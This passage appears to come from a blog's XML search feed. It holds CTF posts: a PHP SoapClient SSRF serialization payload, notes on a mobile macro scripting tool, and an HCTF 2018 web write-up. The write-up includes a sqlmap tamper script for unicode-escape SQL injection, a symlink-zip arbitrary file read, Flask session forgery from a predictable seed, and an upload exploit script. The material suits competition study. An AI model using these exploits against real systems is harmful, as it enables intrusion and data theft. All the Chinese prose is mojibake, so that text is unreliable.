‰∏çÁü•ÈÅìÁéØÂ¢ÉÈóÆÈ¢òËøòÊòØÂï•Ë∞É‰∫ÜÂæà‰πÖÔºåÂú®Á¨¨‰∏ÄÊ≠•‰øÆÊîπsession_handleÁöÑÁ±ªÂûãÊó∂‰øÆÊîπÂ§±Ë¥•‰∫ÜÔºåÂØºËá¥ÂêéÈù¢Êó†Ê≥ïËß¶Âèëssrf„ÄÇÂ§çÁé∞ÁöÑÊó∂ÂÄôÊ≤°ÊúâÂÆòÊñπdockerÔºåË∞É‰∫ÜÂæà‰πÖËøòÊòØ‰∏çÊòØÂæàÊòéÁôΩ‚Ä¶ Â´ñÁöÑexpÔºö12345678$target=&apos;https://127.0.0.1/flag.php&apos;;$b = new SoapClient(null,array(&apos;location&apos; =&gt; $target, &apos;user_agent&apos; =&gt; &quot;AAA:BBB\r\n&quot; . &quot;Cookie:PHPSESSID=dde63k4h9t7c9dfl79np27e912&quot;, &apos;uri&apos; =&gt; &quot;https://127.0.0.1/&quot;));$se = serialize($b); echo urlencode($se); Á¨¨‰∫åÊ≠•Ôºö]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ÊåâÈîÆÁ≤æÁÅµÂ≠¶‰π†ËÆ∞ÂΩï]]></title>
    <url>%2F2019%2F02%2F09%2F%E6%8C%89%E9%94%AE%E7%B2%BE%E7%81%B5%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[‰ª£Á†ÅÔºöhttps://github.com/Passer6y/quickMacro Âü∫Á°Ä Â£∞ÊòéÂèòÈáè:Dim12Dim screenXscreenX = GetScreenXÔºàÔºâ 2.Âª∂Êó∂:Delay1Delay 1000 //Âª∂Êó∂1000ÊØ´ÁßíÔºå‰πüÂ∞±ÊòØ1ÁßíÂÜçÂæÄ‰∏ãÊâßË°å ÁÇπÂáªËß¶Êë∏Â±èÂπï‰∏≠ÁöÑ‰∏Ä‰∏™‰ΩçÁΩÆ-&gt;ÁªèËøá‰∏ÄÂ∞èÊÆµÊó∂Èó¥Âª∂Êó∂-&gt;ÊîæÊâã123TouchDown x,y,1 //x,y‰∏∫ÂùêÊ†áÔºå‰πüÂ∞±ÊòØÁÇπÂáªÂ±èÂπïÁöÑ‰ΩçÁΩÆDelay 50TouchUp 1 tapÂ∞ÅË£Ö‰∫Ü‰ª•‰∏äÁöÑÂá†‰∏™Êìç‰ΩúÊ≠•È™§ÔºöTap x,y ÂÆâÂçì‰∏âÈîÆÔºö‰∏ªËèúÂçï„ÄÅ‰∏ªÈ°µ„ÄÅËøîÂõû 123KeyPress &quot;Menu&quot;KeyPress &quot;Home&quot;KeyPress &quot;Back&quot; Ë∞ÉËØïÔºöShowMessageÂíåTracePrintShowMessage:ÊòæÁ§∫ÊèêÁ§∫Ôºå‰∏§Êù°Ê∂àÊÅØ‰πãÈó¥Âª∫ËÆÆ1Áßí‰ª•‰∏äÈó¥Èöî„ÄÇTracePrintÔºöÂú®Ë∞ÉËØïÈ°µÊòæÁ§∫‰ø°ÊÅØ 1234567Dim Âæ™ÁéØÊ¨°Êï∞ = 0Do Delay 1000 Âæ™ÁéØÊ¨°Êï∞ = Âæ™ÁéØÊ¨°Êï∞+1 TracePrint ‚ÄúÂæ™ÁéØÊ¨°Êï∞Ôºö‚Äù&amp;Âæ™ÁéØÊ¨°Êï∞&amp;‚ÄúÊ¨°‚Äù ShowMessage ‚ÄúÂæ™ÁéØÊ¨°Êï∞Ôºö‚Äù&amp;Âæ™ÁéØÊ¨°Êï∞&amp;‚ÄúÊ¨°‚ÄùLoop ÊªëÂ±èÂπïÔºöswipe 1Swipe 10,10,100,100,300 //‰ªéÂùêÊ†á10,10ÂàíÂä®Âà∞ÂùêÊ†á100,100ÔºåÂéÜÊó∂300ÊØ´Áßí ÊªëÂä® ÂÅúÈ°ø ÂÜçÊùæ12345TouchDown 10, 10, 1Delay 1000TouchMove 100, 100, 1, 300Delay 1000TouchUp 1 Âæ™ÁéØdemo1:Âæ™ÁéØÁÇπÂáª (10,10) ‰∏ÄÂçÉÊ¨°1234For 1000 Tap 10,10 // ÈÄÄÂá∫ Exit ForNext demo2: ‰∏ÄÁõ¥ÁÇπÂáª1234DoTap 10,10//ÈÄÄÂá∫ Exit DoLoop ÂõæËâ≤Êìç‰Ωú Ëé∑ÂèñÂ±èÂπï‰∏äÊüêÁÇπÈ¢úËâ≤ÔºöGetPixelColor() 1234567Dim rColorrColor = GetPixelColor(300, 300)If rColor = &quot;FFFFFF&quot; Then TracePrint &quot;ÂùêÊ†áÔºà300,300ÔºâÁöÑÂÉèÁ¥†ÁÇπÈ¢úËâ≤ÊòØFFFFFFÔºåËØ¥ÊòéÂΩìÂâçÂ§Ñ‰∫éXXÁïåÈù¢‰∏ã&quot;Else TracePrint &quot;ÂùêÊ†áÔºà300,300ÔºâÁöÑÂÉèÁ¥†ÁÇπÈ¢úËâ≤‰∏çÊòØFFFFFFÔºåËØ¥ÊòéËøòÊ≤°Âà∞XXÁïåÈù¢&quot;End If Â§öÁÇπÊØîËâ≤:CmpColorEx(mul_color,sim)Âç≥Âà§Êñ≠ÂΩìÂâçÂú∫ÊôØÂèñÁÇπ(2,2)ÂíåÁÇπ(4,3)‰ª•000000-202020ÁöÑÂÅèËâ≤ËåÉÂõ¥(ÂâçÂêéÂêÑ10),Áõ∏‰ººÂ∫¶0.9ÁöÑÂÆπÈîôÂà§Êñ≠ÊòØÂê¶‰∏∫Âêå‰∏Ä‰∏™ÂõæÔºåÂèØ‰ª•Áî®ÊäìÊäìÂø´Êç∑ÁîüÊàêÂèÇÊï∞„ÄÇ 12345If CmpColorEx(&quot;2|2|000000-202020,4|3|000000-202020&quot;, 0.9) = 1 Then TracePrint &quot;ËøôÊòØÁ¨¨‰∫å‰∏™Âõæ&quot;Else TracePrint &quot;Ëøô‰∏çÊòØÁ¨¨‰∫å‰∏™Âõæ&quot;End If ÊäìÊäìÂø´Êç∑ÁîüÊàêÂèÇÊï∞Ôºö Âèñ‰∏§ÁÇπ-&gt;ÁÇπÂºÄ‚ÄôÈ¢úËâ≤‚Äô-&gt;Âú®‚ÄôÈ¢úËâ≤ËÆ∞ÂΩïÊ±áÊÄª‚ÄôÈÄâ‰∏≠Êàë‰ª¨ÈááÁöÑ‰∏§ÁÇπ-&gt;ËøõÂÖ•‚ÄòÂ§öÁÇπÊØîËâ≤‚ÄôÊ®°Âºè-&gt;Â§çÂà∂‚ÄôÈ¢úËâ≤ÊèèËø∞‚ÄôÂç≥ÂèØ Â§öÁÇπÊâæËâ≤ÔºöFindMultiColorÂç≥ÊâæÂà∞ÂîØ‰∏ÄÁöÑÂõæÊ†áÁöÑ‰ΩúÁî®0,0,0,0Ë°®Á§∫ÂÖ®Â±èÊü•ÊâæÔºå10,20,30,40Ë°®Á§∫‰ªéÂùêÊ†á(10,20)Âíå(30,40)ÁªÑÊàêÁöÑÁü©ÂΩ¢ËåÉÂõ¥„ÄÇ000000ÂàùÂßãÁÇπÁöÑÈ¢úËâ≤ÂÄº?Ôºå000000-202020(202020‰æùÊóßÊòØÂÅèËâ≤)0|1ÊòØÁõ∏ÂØπÂùêÊ†á(ÂæÄÂè≥0ÔºåÂæÄ‰∏ã1)1234567Dim IntX,IntYFindMultiColor 0,0,0,0,&quot;000000&quot;,&quot;0|1|000000-202020&quot;,0,0.9,intX,intYIf intX &gt; -1 Then TracePrint &quot;ÊâæÂà∞Âï¶ÔºåÂùêÊ†áÂú®&quot;&amp;intX&amp;&quot;,&quot;&amp;intYElse TracePrint &quot;Ê≤°ÊâæÂà∞&quot;End If ÊäìÊäìÂ§öÁÇπÊâæËâ≤ÔºöÂíå‰∏äÈù¢‰∏ÄÊ†∑ÁöÑÊñπÊ≥ï ÂáΩÊï∞ ÂÆö‰πâ/Ë∞ÉÁî®ÂáΩÊï∞123Function Ëá™ÂÆö‰πâÂáΩÊï∞() TracePrint ‚ÄúÊàëÊòØËá™ÂÆö‰πâÂáΩÊï∞ÔºåË¢´‰Ω†Ë∞ÉÁî®‰∫Ü‚ÄùEnd Function Ë∞ÉÁî®ÂáΩÊï∞Ôºö123Ëá™ÂÆö‰πâÂáΩÊï∞Ëá™ÂÆö‰πâÂáΩÊï∞() // Êé®ËçêCall Ëá™ÂÆö‰πâÂáΩÊï∞() demo:ÊØîÂ§ßÂ∞è12345678910111213141516Function ÊØîÂ§ßÂ∞è(ÂèÇÊï∞1, ÂèÇÊï∞2) If ÂèÇÊï∞1 &gt; ÂèÇÊï∞2 Then ÊØîÂ§ßÂ∞è = ÂèÇÊï∞1 // ÂáΩÊï∞ËøîÂõûÂÄº ElseIf ÂèÇÊï∞1 &lt; ÂèÇÊï∞2 Then ÊØîÂ§ßÂ∞è = ÂèÇÊï∞2 Else TracePrint &quot;‰∏§‰∏™Êï∞‰∏ÄÊ†∑Â§ß&quot; End IfEnd FunctionDim numA,numBnumA = 3numB = 3If ÊØîÂ§ßÂ∞è(numA, numB) &lt;&gt; null Then TracePrint &quot;ËæÉÂ§ßÁöÑÂÄºÊòØÔºö&quot;&amp;ÊØîÂ§ßÂ∞è(numA,numB)End If Êï∞ÊçÆÁ±ªÂûãËΩ¨Êç¢Êàë‰ª¨‰ªéÁî®Êà∑ËæìÂÖ•‰∏≠ËØªÂèñÁöÑÊï∞ÊçÆÂæÄÂæÄÈúÄË¶ÅÂÅöÁ±ªÂûãËΩ¨Êç¢„ÄÇdemo: Â∞ÜËæìÂÖ•Ê°ÜÁöÑÊï∞ÊçÆ‰ªéÂ≠óÁ¨¶‰∏≤ÂûãÂèòÊàêÊï¥Âûã1234Dim Áî®Êà∑ËæìÂÖ• = ReadUIConfig(&quot;ËæìÂÖ•Ê°Ü1&quot;)If CInt(Áî®Êà∑ËæìÂÖ•) = 1 Then TracePrint Áî®Êà∑ËæìÂÖ•End If Êó•ÂøóÂºÄÂêØlogËÆ∞ÂΩïÂêéÔºå‰ºöÂ∞ÜÊâÄÊúâÁöÑtranceprintÈÉΩËæìÂá∫Âà∞logÊñá‰ª∂123456Log.Open **************TracePrint &quot;test&quot;TracePrint GetTempDir()**************Log.Close ÂàÜËæ®Áéá‰ΩøÁî®ÁöÑ720x1280ÁöÑËÆæÂ§áÂºÄÂèëÁöÑÁ®ãÂ∫èÂàôÊ≥®ÊòéÂ¶Ç‰∏ã‰ª£Á†ÅÔºå‰ª•‰æøÁ®ãÂ∫èËá™ÈÄÇÂ∫îÂÖ∂‰ªñËÆæÂ§á(Â§öÁÇπÊØîËâ≤ÔºåÊâæËâ≤Ëøô‰∫õÂäüËÉΩÊâçÊúâÁî®)1SetScreenScale 720,1280 Â§öÁ∫øÁ®ã‰∏ÄËà¨Áî®‰∫é‰∏Ä‰∏™Á∫øÁ®ãËøêË°åËÑöÊú¨ÔºåÂè¶‰∏Ä‰∏™Á∫øÁ®ãÂπ≤ÂÖ∂‰ªñÁöÑ(Ê£ÄÊµãÊòØÂê¶Âç°‰∏ªÁ≠âÁ≠â)]]></content>
      <categories>
        <category>Code</category>
      </categories>
      <tags>
        <tag>Code</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HCTF 2018 Web Writeup]]></title>
    <url>%2F2019%2F02%2F05%2FHCTF%202018%20Web%20WriteUp%2F</url>
    <content type="text"><![CDATA[ËøëÊù•ÊúâÊó∂Èó¥Ë°•‰∫Ü‰∏Ä‰∏ã‰πãÂâçÊØîËµõÈÅóÁïô‰∏ãÊù•ÁöÑwp Kzone‰ªøÁöÑ‰∏Ä‰∏™qqÁ©∫Èó¥ÁöÑÈíìÈ±ºÁ´ôÔºåwww.zip‰∏ãËΩΩÊ∫êÁ†ÅÂêéÔºåÂ∞ùËØïÂêÑ‰∏™ÂäüËÉΩÁÇπÂÆ°ËÆ°ÔºåÂä®ÊÄÅË∞ÉËØïÂêéÔºåÂèëÁé∞Ê≠£Â∏∏ÁôªÂΩïÁöÑÂäüËÉΩÁÇπ‰∏ç‰ºöËÆæÁΩÆ‰∏Ä‰∏™Âêç‰∏∫`login_data`ÂèÇÊï∞ÁöÑcookieÔºåËÄåËøô‰∏™ÁÇπÂèØ‰ª•Áî®Êù•ÁôªÂΩïÔºå ‰πüÁÆóÊòØÂá∫È¢ò‰∫∫ÂêéÊù•Âä†‰∏äÁöÑÂäüËÉΩÁÇπÔºåÁÑ∂ÂêéÂ∞ÜÂÖ∂ÂΩìÊàêËÄÉÁÇπÔºü ÁôªÂΩïÁöÑÊó∂ÂÄôÊòØ‰∏ç‰ºöËá™Âä®Â∏¶‰∏äËøô‰∏™ÂèÇÊï∞ÁöÑÔºöÊàë‰ª¨ÊâãÂä®ËÆæÁΩÆÂêéÔºåÁÑ∂ÂêéÂ∞ÜÂÖ∂ÂØºÂÖ•Âà∞ÊµèËßàÂô®cookie‰∏≠ÔºåÂèØ‰ª•Áî®Ëøô‰∏™cookieÁôªÂΩï„ÄÇ ÂÖ∂ËøáÁ®ã‰∏∫ÔºöÂú®ÂêéÂè∞ÁôªÂΩïÂâçÔºå‰ºöÂåÖÂê´‰∏Ä‰∏™ÂÖ±ÊúâÁöÑÊñá‰ª∂Ôºö ËøôÈáåÈáçÁÇπÂÖ≥Ê≥®member.phpÔºö ‰ΩøÁî®cookieÁôªÂΩïÁöÑÊï∞ÊçÆ‰ºöËøõË°å‰∏ÄÊ¨°json_decodeËß£Á†ÅÔºö ËøôÈáåÂ≠¶‰π†‰∫ÜÊúâÁöÑÂ∏àÂÇÖ‰ΩøÁî®‰∫Üjson_decode()‰ºöunicodeËá™Âä®Ëß£Á†ÅÁöÑÁâπÊÄßÁªïËøá„ÄÇ Â´ñ‰∫Ü‰∏Ä‰∏™tamperËÑöÊú¨1234567891011121314151617181920212223242526#!/usr/bin/env pythonfrom lib.core.enums import PRIORITY__priority__ = PRIORITY.LOWdef dependencies(): passdef tamper(payload, **kwargs): data = &apos;&apos;&apos;&#123;&quot;admin_user&quot;:&quot;%s&quot;&#125;;&apos;&apos;&apos; payload = payload.lower() payload = payload.replace(&apos;u&apos;, &apos;\u0075&apos;) payload = payload.replace(&apos;o&apos;, &apos;\u006f&apos;) payload = payload.replace(&apos;i&apos;, &apos;\u0069&apos;) payload = payload.replace(&apos;\&apos;&apos;, &apos;\u0027&apos;) payload = payload.replace(&apos;\&quot;&apos;, &apos;\u0022&apos;) payload = payload.replace(&apos; &apos;, &apos;\u0020&apos;) payload = payload.replace(&apos;s&apos;, &apos;\u0073&apos;) payload = payload.replace(&apos;#&apos;, &apos;\u0023&apos;) payload = payload.replace(&apos;&gt;&apos;, &apos;\u003e&apos;) payload = payload.replace(&apos;&lt;&apos;, &apos;\u003c&apos;) payload = payload.replace(&apos;-&apos;, &apos;\u002d&apos;) payload = payload.replace(&apos;=&apos;, &apos;\u003d&apos;) payload = payload.replace(&apos;f1a9&apos;, &apos;F1a9&apos;) payload = payload.replace(&apos;f1&apos;, &apos;F1&apos;) return data % payload python sqlmap.py -r jsondecode --tamper &quot;jsondecodeBypassTamper.py&quot; -v 3 --dbs --dbms=mysql --level 2 ÁÑ∂ÈπÖÈ¢ÑÊúüËß£ÊòØËØªinstall.sqlÔºå‰ºöÂèëÁé∞Êï∞ÊçÆË°®ÂºïÊìé‰ΩøÁî®ÁöÑÊòØinnodb„ÄÇMySQL 5.7 ‰πãÂêéÁöÑÁâàÊú¨ÔºåÂú®ÂÖ∂Ëá™Â∏¶ÁöÑ mysql Â∫ì‰∏≠ÔºåÊñ∞Â¢û‰∫Ü innodb_table_stats Âíå innodb_index_stats Ëøô‰∏§Âº†Êó•ÂøóË°®„ÄÇÂ¶ÇÊûúÊï∞ÊçÆË°®ÁöÑÂºïÊìéÊòØinnodb ÔºåÂàô‰ºöÂú®Ëøô‰∏§Âº†Ë°®‰∏≠ËÆ∞ÂΩïË°®„ÄÅÈîÆÁöÑ‰ø°ÊÅØ„ÄÇ Âõ†‰∏∫ËøáÊª§‰∫ÜorÔºåÊâÄ‰ª•Â∏ÉÂ∞îÁõ≤Ê≥®ÁöÑÊó∂ÂÄôÂà©Áî®setcookieÊ¨°Êï∞ÈÄ†ÊàêÁöÑÂ∑ÆÂºÇËøõË°åÊ≥®ÂÖ•„ÄÇ ÈÄ†ÊàêÂ∏ÉÂ∞îÁõ≤Ê≥®ÁöÑÊµÅÁ®ãÔºöÂ¶ÇÊûúÊü•ËØ¢Áî®Êà∑Âêç‰∏ç‰∏∫Á©∫Ôºå‰∏îÂØÜÁ†ÅÂíåÊï∞ÊçÆÂ∫ì‰∏≠ÂìàÂ∏åËøõË°åÂº±Á±ªÂûãÊØîËæÉÁªïËøáÊàêÂäüÔºåÂàôÁôªÂΩïÊàêÂäü„ÄÇÂ¶ÇÊûúÊü•ËØ¢Áî®Êà∑Âêç‰∏∫Á©∫ÔºåÂΩìÁÑ∂Ê≠§Êó∂ÂØÜÁ†ÅËÇØÂÆö‰πü‰∏ç‰ºöÂíåÁ©∫Áõ∏Á≠âÔºåÊâÄ‰ª•‰ºöÊúâÂõõÊ¨°set-cookie ÂΩìÁÑ∂‰πüÂèØ‰ª•Âú®ÂØÜÁ†Å‰∏ÄÁõ¥ÊØîËæÉÈîôËØØÁöÑÊÉÖÂΩ¢‰∏ãÂà©Áî®ÔºöÁî®Êà∑ÂêçÂ≠óÊÆµÊü•ËØ¢‰∏çÂà∞‰∏úË•ø(‰∏∫Á©∫)Ôºöset-cookieÂõõÊ¨°Áî®Êà∑ÂêçÂ≠óÊÆµÊü•ËØ¢Âà∞‰∏úË•øÔºöset-cookoe‰∏§Ê¨° HideAndSeekÊ≥®ÂÜåÂêéÈ¢òÁõÆÊòØ‰∏Ä‰∏™‰∏ä‰º†zipÊñá‰ª∂ÁöÑÂú∞ÊñπÔºå‰ºöËá™Âä®Ëß£ÂéãÂπ∂Ê∏≤ÊüìÂá∫Êñá‰ª∂ÂÜÖÂÆπ„ÄÇÂ•áÊÄ™ÁöÑÊòØÊèê‰∫§ÂÆå‰πãÂêéÁõ¥Êé•Â∞±Âú®ËøôÊ†∑‰∏Ä‰∏™https://206.189.144.143:20000/uploadË∑ØÂæÑ‰∏ãÊ∏≤Êüì‰∫ÜÔºå‰πüÊ≤°ÊúâÂÖ∑‰ΩìÁöÑÊñá‰ª∂ÂêçÁ≠â‰ø°ÊÅØ„ÄÇ Â¶ÇÊûúÂÜçÂéªËÆøÈóÆupload‰ºöËøõË°åË∑≥ËΩ¨ÔºåÊâÄ‰ª•ÁåúÊµãÊòØÊ∏≤Êüì‰∏ÄÊ¨°‰πãÂêéÂ∞±Âà†‰∫Ü„ÄÇÂ∞ùËØïÊûÑÈÄ†Êñá‰ª∂Âêç../../../../../../etc/passwdÁöÑÂéãÁº©Êñá‰ª∂(ÁûéËØïÁöÑ)ÔºåËøîÂõû‰∏ÄÁâáÁ©∫ÁôΩ..ÂÖ∂Ê¨°ÂéãÁº©Êñá‰ª∂ÈáåÊúâÁõÆÂΩïÁªìÊûÑÔºå‰πü‰ºöËøîÂõûÁ©∫ÁôΩ„ÄÇ ÁΩë‰∏äÊâæÂà∞‰∏ÄÁØáÊñá‰ª∂‰∏ä‰º†ËΩØËøûÊé•ÁöÑÊñáÁ´†Ôºöhttps://xz.aliyun.com/t/2589 ÊûÑÈÄ†ËΩØËøûÊé•ÂéãÁº©Êñá‰ª∂ zip -y Ë°®Á§∫Â≠òÂÇ®ÈìæÊé•Êñá‰ª∂Ôºå‰∏ç‰ºöÊõø‰ª£Ê∫êÊñá‰ª∂ ‰∏ä‰º†ÂéãÁº©Êñá‰ª∂ÂêéÂæóÂà∞Ôºö Áé∞Âú®Êúâ‰∫Ü‰∏Ä‰∏™‰ªªÊÑèÊñá‰ª∂ËØªÂèñÔºåÊé•‰∏ãÊù•ÂæóÁåúÊµãÁõÆÂΩï,Â∞ùËØïËØªÂèñproc‰º™Êñá‰ª∂`/proc/self/cwd ËØª‰∏çÂà∞‰∏úË•øÔºåÁåúÊÉ≥ÂéüÂõ†Â¶Ç‰∏ãÔºö ÂÜçËØïËØïËØªÁéØÂ¢ÉÂèòÈáèÔºö/proc/self/environ,ËøôÈáåËØªÂà∞‰∫ÜÂæàÂ§öÁõ∏ÂÖ≥Êñá‰ª∂‰ø°ÊÅØ ÂÜçËØª‰∏Ä‰∏ãÔºö/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.ini Áü•ËØÜÈù¢Â§™Á™Ñ‰∫ÜÔºåÊ≤°Êé•Ëß¶ËøáflaskÔºåÂêéÊù•ÊâçÁü•ÈÅìËøôÊòØÊ∫êÁ†ÅË∑ØÂæÑÔºö/app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py ÂèçÊ≠£Ê∫êÁ†ÅÂ∞±Â§ßÊ¶ÇÂú®/appÁõÆÂΩï‰∏ãÔºå‰πãÂêéÂ∞±ÊòØËÑëÊ¥ûÂíåÁªèÈ™å‰∫Ü.. wpËØ¥Áî±cookieÂèØ‰ª•ÁåúÂà∞ÊòØflaskÔºåÁÑ∂ÂêéÊèêÁ§∫Áî®ÁöÑdockerÔºåÈªòËÆ§Âú®/app/main.pyÔºåÊâÄ‰ª•ÂéªËØª/app/main.py12345678910111213141516171819import sysfrom flask import Flaskapp = Flask(__name__)@app.route(&quot;/&quot;)def hello(): version = &quot;&#123;&#125;.&#123;&#125;&quot;.format(sys.version_info.major, sys.version_info.minor) message = &quot;Hello World from Flask in a uWSGI Nginx Docker container with Python &#123;&#125; (default)&quot;.format( version ) return messageif __name__ == &quot;__main__&quot;: app.run(host=&quot;0.0.0.0&quot;, debug=True, port=80) ËØªÂá∫Ê∫êÁ†ÅÔºö123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687# -*- coding: utf-8 -*-from flask import Flask,session,render_template,redirect, url_for, escape, request,Responseimport uuidimport base64import randomimport flagfrom werkzeug.utils import secure_filenameimport osrandom.seed(uuid.getnode())app = Flask(__name__)app.config[&apos;SECRET_KEY&apos;] = str(random.random()*100)app.config[&apos;UPLOAD_FOLDER&apos;] = &apos;./uploads&apos;app.config[&apos;MAX_CONTENT_LENGTH&apos;] = 100 * 1024ALLOWED_EXTENSIONS = set([&apos;zip&apos;])def allowed_file(filename): return &apos;.&apos; in filename and \ filename.rsplit(&apos;.&apos;, 1)[1].lower() in ALLOWED_EXTENSIONS@app.route(&apos;/&apos;, methods=[&apos;GET&apos;])def index(): error = request.args.get(&apos;error&apos;, &apos;&apos;) if(error == &apos;1&apos;): session.pop(&apos;username&apos;, None) return render_template(&apos;index.html&apos;, forbidden=1) if &apos;username&apos; in session: return render_template(&apos;index.html&apos;, user=session[&apos;username&apos;], flag=flag.flag) else: return render_template(&apos;index.html&apos;)@app.route(&apos;/login&apos;, methods=[&apos;POST&apos;])def login(): username=request.form[&apos;username&apos;] password=request.form[&apos;password&apos;] if request.method == &apos;POST&apos; and username != &apos;&apos; and password != &apos;&apos;: if(username == &apos;admin&apos;): return redirect(url_for(&apos;index&apos;,error=1)) session[&apos;username&apos;] = username return redirect(url_for(&apos;index&apos;))@app.route(&apos;/logout&apos;, methods=[&apos;GET&apos;])def logout(): session.pop(&apos;username&apos;, None) return redirect(url_for(&apos;index&apos;))@app.route(&apos;/upload&apos;, methods=[&apos;POST&apos;])def upload_file(): if &apos;the_file&apos; not in request.files: return redirect(url_for(&apos;index&apos;)) file = request.files[&apos;the_file&apos;] if file.filename == &apos;&apos;: return redirect(url_for(&apos;index&apos;)) if file and allowed_file(file.filename): filename = secure_filename(file.filename) file_save_path = os.path.join(app.config[&apos;UPLOAD_FOLDER&apos;], filename) if(os.path.exists(file_save_path)): return &apos;This file already exists&apos; file.save(file_save_path) else: return &apos;This file is not a zipfile&apos; try: extract_path = file_save_path + &apos;_&apos; os.system(&apos;unzip -n &apos; + file_save_path + &apos; -d &apos;+ extract_path) read_obj = os.popen(&apos;cat &apos; + extract_path + &apos;/*&apos;) file = read_obj.read() read_obj.close() os.system(&apos;rm -rf &apos; + extract_path) except Exception as e: file = None os.remove(file_save_path) if(file != None): if(file.find(base64.b64decode(&apos;aGN0Zg==&apos;).decode(&apos;utf-8&apos;)) != -1): return redirect(url_for(&apos;index&apos;, error=1)) return Response(file)if __name__ == &apos;__main__&apos;: #app.run(debug=True) app.run(host=&apos;127.0.0.1&apos;, debug=True, port=10008) ÁúãÂà∞‰ªñimport‰∫ÜflagÔºåÁõ¥Êé•ÂéªËØªflagÔºåÁÑ∂ÈπÖ..Áõ¥Êé•Ë¢´Êã¶‰∫Ü ÊâÄ‰ª•Áé∞Âú®ÊÄùË∑ØÂ∞±ÊòØË∂äÊùÉÊàê‰∏∫adminÔºåËøôÈáå‰ΩøÁî®ÁöÑ‰∏Ä‰∏™Âõ∫ÂÆöÁöÑÈöèÊú∫Êï∞ÁßçÂ≠êÔºåuuid.getnode()Ëé∑Âæó10ËøõÂà∂macÂú∞ÂùÄÔºåÂèØ‰ª•Âú®/sys/class/net/eth0/addressËØªÂà∞macÂú∞ÂùÄÔºåÊâÄ‰ª•ÂèØ‰ª•‰º™ÈÄ†sessionË∂äÊùÉÁß∞‰∏∫adminÔºå ËØªÂà∞macÂú∞ÂùÄÔºö02:42:ac:11:00:02ÔºåÂú®Á∫øËΩ¨Êàê10ËøõÂà∂Ôºöhttps://www.vultr.com/tools/mac-converter/?mac_address=02%3A42%3Aac%3A11%3A00%3A02ÂæóÂà∞ÁßçÂ≠êÔºö2485377892354 ÁÑ∂ÂêéÊú¨Âú∞Êê≠‰∏Ä‰∏ãflaskÁéØÂ¢ÉÊãøÂà∞sessionÂç≥ÂèØÂæóÂà∞flag„ÄÇ ÊúÄÂêéÁúã‰∫ÜÂÖ∂‰ªñÂ∏àÂÇÖ‰ª¨ÁöÑwpÔºåËøòÂèØ‰ª•ËØª.bash_historyÁ≠âÁ≠âÔºåËøôÈáåÂ´ñ‰∫Ü‰∏Ä‰∏™exp(ÊàëÂÖ®Á®ãÊâãÂä®Êìç‰ΩúÁöÑ..)1234567891011121314151617181920212223242526272829303132333435363738394041import requestsimport random import osimport stringimport timeimport zipfileimport sysdef generate_zip(path,i): zip_name = &apos;moxiaoxi&apos;+str(i)+&apos;.zip&apos; link_namme = &apos;moxiaoxi&apos;+str(i) os.system(&quot;ln -s &#123;&#125; &#123;&#125;&quot;.format(path,link_namme)) print &quot;ln -s &#123;&#125; &#123;&#125;&quot;.format(path,link_namme) os.system(&quot;zip -y &#123;&#125; &#123;&#125;&quot;.format(zip_name,link_namme)) with open(zip_name,&apos;r&apos;) as f: data = f.read() return zip_name,datadef exp(path,i): zip_name,data = generate_zip(path,i) # zip_name,data = rewrite(path,i) session = requests.Session() paramsPost = &#123;&quot;submit&quot;:&quot;Submit&quot;&#125; paramsMultipart = [(&apos;the_file&apos;, (zip_name, data, &apos;application/zip&apos;))] headers = &#123;&quot;Accept&quot;:&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;,&quot;Upgrade-Insecure-Requests&quot;:&quot;1&quot;,&quot;User-Agent&quot;:&quot;Mozilla/5.0 (Linux; Android 9.0; SAMSUNG-SM-T377A Build/NMF26X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Mobile Safari/537.36&quot;,&quot;Referer&quot;:&quot;https://hideandseek.2018.hctf.io/&quot;,&quot;Connection&quot;:&quot;close&quot;,&quot;Accept-Language&quot;:&quot;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&quot;,&quot;Accept-Encoding&quot;:&quot;gzip, deflate&quot;,&quot;DNT&quot;:&quot;1&quot;&#125; cookies = &#123;&quot;session&quot;:&quot;eyJ1c2VybmFtZSI6Im1veGlhb3hpIn0.Dsf5zA.yM84QphtcfEoykAu2lwjxp7_QvI&quot;&#125; response = session.post(&quot;https://hideandseek.2018.hctf.io/upload&quot;, data=paramsPost, files=paramsMultipart, headers=headers, cookies=cookies) print(&quot;Status code: %i&quot; % response.status_code) print(&quot;Response body: %s&quot; % response.content) if len(response.content)&gt;5: # print(&quot;Response body: %s&quot; % response.content) with open(&apos;out.txt&apos;,&apos;a+&apos;) as f: f.write(&apos;\n\n&#123;&#125;\n\n&#123;&#125;&apos;.format(path,response.content)) if __name__==&apos;__main__&apos;: name = &apos;test&apos;+&apos;&apos;.join(random.sample(string.ascii_letters + string.digits, 4)) exp(sys.argv[1],name)]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSS Tricks]]></title>
    <url>%2F2019%2F01%2F29%2FCSS%20Tricks%2F</url>
